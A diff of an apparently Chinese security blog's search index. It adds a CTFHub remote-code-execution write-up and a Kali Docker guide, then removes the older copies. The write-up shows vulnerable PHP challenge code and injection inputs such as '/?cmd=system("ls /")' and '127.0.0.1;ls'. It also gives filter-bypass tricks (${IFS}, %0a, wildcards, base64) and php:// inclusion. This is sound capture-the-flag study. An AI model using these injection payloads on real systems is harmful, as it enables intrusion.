@@ -1025,6 +1025,109 @@ handler 指向 RequestHandler<br />
       </tags>
   </entry>
   <entry>
+    <title>ctfhub-rce</title>
+    <url>/2022/04/ctfhub-rce/</url>
+    <content><![CDATA[<p>rce：远程代码执行漏洞<br />
+分为远程命令执行 ping 和远程代码执行 evel。<br />
+<strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是 RCE 漏洞</strong>。相当于直接操控服务器电脑的 cmd 命令行！高危漏洞！</p>
+<h2 id="eval-执行"><a class="markdownIt-Anchor" href="#eval-执行"></a> eval 执行</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>传参给 cmd 来 eval</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>);<span class="comment">//此处因为根目录无flag 所以看上一级目录</span></span><br></pre></td></tr></table></figure>
+<p>找到后 再 cat /flag_****</p>
+<h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2>
+<p>这里使用 strpos 函数</p>
+<blockquote>
+<p>strpos:查找字符串首次出现的位置</p>
+<p>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</p>
+</blockquote>
+<p>题目使用</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>],<span class="string">&quot;flag&quot;</span>))&#123;<span class="comment">//无flag字符即可运行</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>来包含文件，而下方给出的 shell.txt 含有 eval 漏洞</p>
+<p>于是包含它（shell.txt 没有“flag”字符 所以这里 strpos 没影响）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218182857507.png" alt="image-20220218182857507" /></p>
+<p>通过 get(包含文件) post(传参)并用来得到 flag</p>
+<h2 id="php-info"><a class="markdownIt-Anchor" href="#php-info"></a> php info</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">	if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">         &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    	&#125;&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    highlight_file(__FILE__);&#125;?&gt;</span><br><span class="line">&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<p>点击 phpinfo 链接 可查看 php 环境</p>
+<h3 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput"></a> php://input</h3>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*php:// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">php://input是个可以访问请求的原始数据的只读流。</span></span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218162728184.png" alt="image-20220218162728184" /></p>
+<h2 id="读取源代码"><a class="markdownIt-Anchor" href="#读取源代码"></a> 读取源代码</h2>
+<p>看环境 无法使用 php://input</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>但还必须是 php://开头</p>
+<h3 id="phpfilter"><a class="markdownIt-Anchor" href="#phpfilter"></a> <a href="https://www.php.net/manual/zh/wrappers.php.php">php://filter</a></h3>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219174206504.png" alt="image-20220219174206504" /></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219112308277.png" alt="image-20220219112308277" /></p>
+<h2 id="远程包含"><a class="markdownIt-Anchor" href="#远程包含"></a> 远程包含</h2>
+<p>同 phpinfo 做法相同</p>
+<h2 id="命令注入"><a class="markdownIt-Anchor" href="#命令注入"></a> 命令注入</h2>
+<p>输入命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+<p>然后 cat 时出现了问题</p>
+<p>输出被限制了</p>
+<p>于是用管道符号来限制输出 base64</p>
+<p>得到后再解码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218170811553.png" alt="image-20220218170811553" /></p>
+<h2 id="过滤-cat"><a class="markdownIt-Anchor" href="#过滤-cat"></a> 过滤 cat</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;//过滤了cat</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if ($res) &#123;</span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="more"><a class="markdownIt-Anchor" href="#more"></a> more</h2>
+<p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">more <span class="section">[-dlfpcsu]</span> <span class="section">[-num]</span> <span class="section">[+/pattern]</span> <span class="section">[+linenum]</span> <span class="section">[fileNames..]</span></span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218171602745.png" alt="image-20220218171602745" /></p>
+<h2 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h2>
+<p>在 linux 里空格可用&lt; 或 ${IFS}代替</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218171910282.png" alt="image-20220218171910282" /></p>
+<h2 id="过滤运算符"><a class="markdownIt-Anchor" href="#过滤运算符"></a> 过滤运算符</h2>
+<p>cat [file]|base64 还可以用 base64 [file]</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219104650896.png" alt="image-20220219104650896" /></p>
+<h2 id="综合练习"><a class="markdownIt-Anchor" href="#综合练习"></a> 综合练习</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span></span><br></pre></td></tr></table></figure>
+<p>;可以用%0a(url 编码) cat 用 base64 flag 用正则 f*** *lag 等 空格用 ${IFS}</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219105932534.png" alt="image-20220219105932534" /></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219110644693.png" alt="image-20220219110644693" /><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219110736333.png" alt="image-20220219110736333" /></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali安装docker</title>
+    <url>/2022/03/docker/</url>
+    <content><![CDATA[<h2 id="kali-安装-docker"><a class="markdownIt-Anchor" href="#kali-安装-docker"></a> kali 安装 docker</h2>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker-engine</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装结束，打开docker服务</span></span></span><br><span class="line">service docker start</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 验证安装，运行测试样例</span></span></span><br><span class="line">docker --version</span><br><span class="line">docker run hello-world</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试</span></span><br></pre></td></tr></table></figure>
+<h2 id="docker-常用命令"><a class="markdownIt-Anchor" href="#docker-常用命令"></a> docker 常用命令</h2>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker --version</span><br><span class="line">docker images</span><br><span class="line">docker ps -a</span><br><span class="line">docker run -d --name 123 -p 127.0.0.1:80:80 镜像名</span><br><span class="line">docker stop 123</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.runoob.com/docker/docker-command-manual.html">其他常用命令见菜鸟教程</a></p>
+<h2 id="dockers-底层原理"><a class="markdownIt-Anchor" href="#dockers-底层原理"></a> dockers 底层原理</h2>
+<h3 id="namespaces"><a class="markdownIt-Anchor" href="#namespaces"></a> Namespaces</h3>
+<blockquote>
+<p>命名空间是 Linux 为我们提供的<code>用于分离进程树、网络接口、挂载点以及进程间通信等资源</code>的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p>
+</blockquote>
+<h3 id="cgroups"><a class="markdownIt-Anchor" href="#cgroups"></a> CGroups</h3>
+<blockquote>
+<p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们<code>提供物理资源上的隔离</code>，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。<br />
+如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。<br />
+<code>在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。</code></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>教程</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>kali</tag>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow黑盒测试</title>
     <url>/2023/01/ctfshow%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<h2 id="web380"><a class="markdownIt-Anchor" href="#web380"></a> web380</h2>
@@ -1122,109 +1225,6 @@ handler 指向 RequestHandler<br />
       <tags>
         <tag>web</tag>
         <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali安装docker</title>
-    <url>/2022/03/docker/</url>
-    <content><![CDATA[<h2 id="kali-安装-docker"><a class="markdownIt-Anchor" href="#kali-安装-docker"></a> kali 安装 docker</h2>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install docker-engine</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 安装结束，打开docker服务</span></span></span><br><span class="line">service docker start</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 验证安装，运行测试样例</span></span></span><br><span class="line">docker --version</span><br><span class="line">docker run hello-world</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试</span></span><br></pre></td></tr></table></figure>
-<h2 id="docker-常用命令"><a class="markdownIt-Anchor" href="#docker-常用命令"></a> docker 常用命令</h2>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker --version</span><br><span class="line">docker images</span><br><span class="line">docker ps -a</span><br><span class="line">docker run -d --name 123 -p 127.0.0.1:80:80 镜像名</span><br><span class="line">docker stop 123</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.runoob.com/docker/docker-command-manual.html">其他常用命令见菜鸟教程</a></p>
-<h2 id="dockers-底层原理"><a class="markdownIt-Anchor" href="#dockers-底层原理"></a> dockers 底层原理</h2>
-<h3 id="namespaces"><a class="markdownIt-Anchor" href="#namespaces"></a> Namespaces</h3>
-<blockquote>
-<p>命名空间是 Linux 为我们提供的<code>用于分离进程树、网络接口、挂载点以及进程间通信等资源</code>的方法。在日常使用 Linux 时，我们并没有运行多个完全分离的服务器的需要，但是如果我们在服务器上启动了多个服务，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，这是很多时候我们都不愿意看到的，我们更希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p>
-</blockquote>
-<h3 id="cgroups"><a class="markdownIt-Anchor" href="#cgroups"></a> CGroups</h3>
-<blockquote>
-<p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们<code>提供物理资源上的隔离</code>，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。<br />
-如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。<br />
-<code>在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。</code></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>教程</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>kali</tag>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfhub-rce</title>
-    <url>/2022/04/ctfhub-rce/</url>
-    <content><![CDATA[<p>rce：远程代码执行漏洞<br />
-分为远程命令执行 ping 和远程代码执行 evel。<br />
-<strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是 RCE 漏洞</strong>。相当于直接操控服务器电脑的 cmd 命令行！高危漏洞！</p>
-<h2 id="eval-执行"><a class="markdownIt-Anchor" href="#eval-执行"></a> eval 执行</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>传参给 cmd 来 eval</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>);<span class="comment">//此处因为根目录无flag 所以看上一级目录</span></span><br></pre></td></tr></table></figure>
-<p>找到后 再 cat /flag_****</p>
-<h2 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h2>
-<p>这里使用 strpos 函数</p>
-<blockquote>
-<p>strpos:查找字符串首次出现的位置</p>
-<p>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</p>
-</blockquote>
-<p>题目使用</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>],<span class="string">&quot;flag&quot;</span>))&#123;<span class="comment">//无flag字符即可运行</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>来包含文件，而下方给出的 shell.txt 含有 eval 漏洞</p>
-<p>于是包含它（shell.txt 没有“flag”字符 所以这里 strpos 没影响）</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218182857507.png" alt="image-20220218182857507" /></p>
-<p>通过 get(包含文件) post(传参)并用来得到 flag</p>
-<h2 id="php-info"><a class="markdownIt-Anchor" href="#php-info"></a> php info</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">	if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">         &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    	&#125;&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    highlight_file(__FILE__);&#125;?&gt;</span><br><span class="line">&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-<p>点击 phpinfo 链接 可查看 php 环境</p>
-<h3 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput"></a> php://input</h3>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*php:// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">php://input是个可以访问请求的原始数据的只读流。</span></span><br></pre></td></tr></table></figure>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218162728184.png" alt="image-20220218162728184" /></p>
-<h2 id="读取源代码"><a class="markdownIt-Anchor" href="#读取源代码"></a> 读取源代码</h2>
-<p>看环境 无法使用 php://input</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>但还必须是 php://开头</p>
-<h3 id="phpfilter"><a class="markdownIt-Anchor" href="#phpfilter"></a> <a href="https://www.php.net/manual/zh/wrappers.php.php">php://filter</a></h3>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219174206504.png" alt="image-20220219174206504" /></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219112308277.png" alt="image-20220219112308277" /></p>
-<h2 id="远程包含"><a class="markdownIt-Anchor" href="#远程包含"></a> 远程包含</h2>
-<p>同 phpinfo 做法相同</p>
-<h2 id="命令注入"><a class="markdownIt-Anchor" href="#命令注入"></a> 命令注入</h2>
-<p>输入命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure>
-<p>然后 cat 时出现了问题</p>
-<p>输出被限制了</p>
-<p>于是用管道符号来限制输出 base64</p>
-<p>得到后再解码</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218170811553.png" alt="image-20220218170811553" /></p>
-<h2 id="过滤-cat"><a class="markdownIt-Anchor" href="#过滤-cat"></a> 过滤 cat</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/cat/&quot;, $ip, $m)) &#123;//过滤了cat</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if ($res) &#123;</span><br><span class="line">        print_r($res);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="more"><a class="markdownIt-Anchor" href="#more"></a> more</h2>
-<p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">more <span class="section">[-dlfpcsu]</span> <span class="section">[-num]</span> <span class="section">[+/pattern]</span> <span class="section">[+linenum]</span> <span class="section">[fileNames..]</span></span><br></pre></td></tr></table></figure>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218171602745.png" alt="image-20220218171602745" /></p>
-<h2 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h2>
-<p>在 linux 里空格可用&lt; 或 ${IFS}代替</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220218171910282.png" alt="image-20220218171910282" /></p>
-<h2 id="过滤运算符"><a class="markdownIt-Anchor" href="#过滤运算符"></a> 过滤运算符</h2>
-<p>cat [file]|base64 还可以用 base64 [file]</p>
